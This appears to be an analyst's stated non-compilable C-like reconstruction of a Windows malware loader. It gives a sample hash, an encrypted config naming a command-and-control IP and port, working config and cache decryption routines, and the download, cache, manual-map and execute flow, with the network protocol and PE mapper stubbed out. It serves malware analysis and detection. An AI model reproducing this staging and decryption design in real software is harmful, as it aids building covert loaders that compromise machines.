/*
 * SAFE, NON-COMPILABLE C-LIKE DECOMPILATION
 *
 * Sample: D:\7.0_64_create_thread_safe.exe
 * SHA-256: 8FDF00F61A4953846BEDC651F05BBD09B0247D9781C89DCE98FDDE72F18D9656
 *
 * This is a behavior-oriented reconstruction.  Deliberately omitted are
 * executable implementations of the network protocol, reflective PE mapper,
 * and code-transfer primitives.  Names are assigned from static analysis;
 * the original symbols were not present.
 */

struct DMV2_Config {
    char     magic[4];                       // "DMV2"
    uint32_t size;                           // 0x1D0
    uint32_t version;                        // 2
    char     server[255];                    // "154.82.93.152"
    char     cache_name_and_xor_key[60];     // "853EAFC200002A0D"
    char     marker[7];                      // "%@)!#!$"
    byte     unknown_0x14e[6];
    uint16_t port;                           // 443
    byte     unknown_0x156[6];
    byte     handshake_field_16[16];         // exact value in REPORT.md
    byte     pinned_key_or_identity_32[32];  // exact value in REPORT.md
    byte     remainder[68];
};

static byte dmv2_keystream_byte(uint32_t key, uint32_t index)
{
    uint32_t x = key - index * 0x61C88647;
    x ^= x >> 16;
    x *= 0x7FEB352D;
    x ^= x >> 15;
    x *= 0x846CA68B;
    return (byte)((x >> 16) ^ x);
}

static void decrypt_dmv2(byte *data, uint32_t length)
{
    for (uint32_t i = 0; i < length; ++i)
        data[i] ^= dmv2_keystream_byte(0xC0DEFACE, i);
}

static void repeating_key_xor(byte *data, uint32_t length, const char *key)
{
    // The sample caps key scanning at 30 bytes.  This config uses 16 bytes.
    uint32_t key_length = bounded_strlen(key, 30);
    for (uint32_t i = 0; i < length; ++i)
        data[i] ^= key[i % key_length];
}

static char *make_cache_path(Context *ctx, const DMV2_Config *cfg)
{
    // Reconstructed payload offsets 0x317B..0x328B.
    char *path = alloc_rwx(0x200);
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, 0, path);
    append(path, "\\");
    append(path, cfg->cache_name_and_xor_key);
    CreateDirectoryA(path, NULL);
    append(path, "\\1");
    return path;  // normally C:\ProgramData\853EAFC200002A0D\1
}

static bool unpack_map_and_start(Context *ctx, byte *compressed, uint32_t size)
{
    byte *image = alloc_rw(0x100000);
    int image_size = aplib_like_depack(compressed, size, image);
    if (image_size < 0)
        return false;

    /*
     * manual_map_x64_pe validates MZ/PE32+/AMD64, copies headers/sections,
     * applies x86/x64 relocations, resolves imports, runs TLS callbacks and
     * the PE entry point, then resolves export hash 0x2EC07661 and invokes it
     * with the decrypted DMV2 config.
     */
    bool ok = manual_map_x64_pe_and_invoke_export_hash(
        image, 0x2EC07661, ctx->config
    );
    free(image);
    return ok;
}

static bool try_cached_stage(Context *ctx, const DMV2_Config *cfg)
{
    char *path = make_cache_path(ctx, cfg);
    byte *buffer = alloc_rwx(0x40000E);
    uint32_t size = read_entire_file_if_between(path, buffer, 0x2801, 0x400000);
    free(path);
    if (size == 0)
        return false;

    repeating_key_xor(buffer, size, cfg->cache_name_and_xor_key);
    bool ok = unpack_map_and_start(ctx, buffer, size);
    free(buffer);
    return ok;
}

static bool download_stage_once(Context *ctx, const DMV2_Config *cfg)
{
    /*
     * The real routine opens raw TCP to cfg->server:cfg->port, performs the
     * custom authenticated "Magnet Wire v2" handshake, accepts framed
     * messages 0x1F (metadata), 0x20 (data), 0x21 (end/checksum), and verifies
     * lengths and CRC-32.  The transfer is capped at 4 MiB.
     *
     * Protocol and mapper internals are intentionally represented as one
     * non-operational call here.
     */
    Download d = receive_authenticated_stage_safely_summarized(
        cfg->server,
        cfg->port,
        cfg->handshake_field_16,
        cfg->pinned_key_or_identity_32,
        0x400000
    );
    if (!d.valid)
        return false;

    // Cache is encrypted on disk with the repeating ASCII key.
    char *path = make_cache_path(ctx, cfg);
    repeating_key_xor(d.bytes, d.size, cfg->cache_name_and_xor_key);
    bool stored = write_entire_file(path, d.bytes, d.size);
    repeating_key_xor(d.bytes, d.size, cfg->cache_name_and_xor_key);
    free(path);
    if (!stored)
        return false;

    return unpack_map_and_start(ctx, d.bytes, d.size);
}

int reconstructed_payload_main(void)
{
    byte *base = find_own_position_independent_base();
    DMV2_Config *cfg = find_marker(base, "%@)!#!$") + 7;
    decrypt_dmv2((byte *)cfg, 0x1D0);

    if (memcmp(cfg->magic, "DMV2", 4) != 0 ||
        cfg->size != 0x1D0 || cfg->version != 2 ||
        all_zero(cfg->pinned_key_or_identity_32, 32))
        return 0;

    Context ctx = resolve_required_apis_by_hash();
    ctx.config = cfg;

    if (try_cached_stage(&ctx, cfg))
        sleep_forever_in_60_second_intervals();

    if (WSAStartup(MAKEWORD(2, 2), &ctx.wsa_data) != 0)
        return 1;

    while (!download_stage_once(&ctx, cfg))
        Sleep(5000);

    WSACleanup();
    sleep_forever_in_60_second_intervals();
}

int reconstructed_outer_loader(void)
{
    /*
     * Opens its own EXE, validates a 40-byte EOF trailer whose magic is
     * "BLT_PAYLOAD_001\0", reads the 18,307-byte embedded payload, allocates
     * RWX memory, and transfers control to it through CreateThread.
     * The payload then self-decodes through 18 polymorphic mutation/XOR layers.
     */
    Trailer t = read_and_validate_self_trailer();
    byte *payload = read_embedded_payload(t.offset, t.size);
    byte *rwx = allocate_rwx_and_copy(payload, t.size);
    return start_payload_thread_and_wait(rwx);
}
